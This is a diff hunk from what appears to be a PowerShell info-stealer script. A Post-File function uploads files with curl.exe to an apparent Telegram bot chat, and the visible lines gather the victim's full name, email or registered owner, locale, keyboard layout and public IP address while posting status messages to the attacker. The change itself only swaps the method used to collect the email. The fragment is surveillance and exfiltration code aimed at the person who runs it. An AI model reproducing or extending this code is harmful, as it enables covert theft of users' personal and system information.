@@ -35,7 +35,7 @@ Function Post-File{curl.exe -F chat_id="$ChatID" -F document=@"$filePath" "https
 $contents = "$comp Gathering System Information for $env:COMPUTERNAME $comp"
 Post-Message
 $userInfo = Get-WmiObject -Class Win32_UserAccount ;$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
-$email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches ;$email = ("$email").Trim()
+$email = (Get-ComputerInfo).WindowsRegisteredOwner
 $systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
 $userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
 $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
